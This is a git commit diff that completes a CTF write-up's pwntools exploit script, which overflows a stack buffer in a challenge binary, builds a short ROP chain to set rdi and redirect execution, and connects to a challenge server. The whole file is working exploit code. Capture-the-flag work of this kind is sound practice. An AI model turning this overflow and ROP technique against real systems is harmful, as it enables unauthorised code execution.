df8fce38006c8487c8ab3af2d1a18369d3b8f68b
Vesa-Pekka Palmu <vpalmu@depili.fi>
2024-09-18 12:39:39 +0300

    The real pwn python code

--- writeup/solved_files/ssh_hack.py
+++ writeup/solved_files/ssh_hack.py
@@ -1,48 +1,54 @@
-#from pwnlib import process
 from pwn import *
 
 elf = ELF('ssh-1.bin')
 rop = ROP(elf)
 
-username = b''
-
-
 if len(sys.argv) > 1 and sys.argv[1] == 'server':
-    io = remote('127.0.0.1',1)
-    #context.terminal = "urxvt"
+    io = remote('94.237.112.76',42069)
 elif len(sys.argv) > 1 and sys.argv[1] == 'gdb':
     context(terminal=['tmux', 'split-window', '-v'])
     #context(terminal=['urxvt'])
     #context.terminal = 'urxvt'
     io = gdb.debug('./ssh-1.bin', '''
-        # add a breakpoint
-        break *0x12345678
+        break *0x0040170e
+        # the stack broken ret
+        break *0x00401719
+        # multipop
+        break *0x00401a14
+        # file read
+        break *0x0040154d
+        #deadfood check
+        break *0x00401590
         continue
-        # Print stack
         x/64x $sp
-        # Print registers
         info registers
         ''')
 else:
     io = process('./ssh-1.bin')
 
 print(io.recvregex(b':')) # read until we get the prompt
-io.sendline(username)
-print(io.recvregex(b':')) # read until we get the prompt)
+io.sendline(b'armand')
+print(io.recvregex(b':')) # read until we get the prompt
+
+offset = 88
 
 
 def attack():
-    offset = 12345
+    nothing_to_see_here_addr = 0x00401526
+    disobey_addr = 0x0040151c
 
-    padding = offset*b'a'
+    padding = 80*b'a'
 
     payload = padding
+    payload += struct.pack("Q", 0x0) # This goes into rbp first
+    payload += struct.pack("Q", disobey_addr) # rop to get rdi set up and keep ok
+    payload += struct.pack("Q", 0xdeadf00ddeadf00d) # address for rdi
+    payload += struct.pack("Q", nothing_to_see_here_addr) # place to go with new rdi
 
     info("Sending payload: ", payload)
 
     io.sendline(payload)
     io.interactive()
-
 
 attack()
 
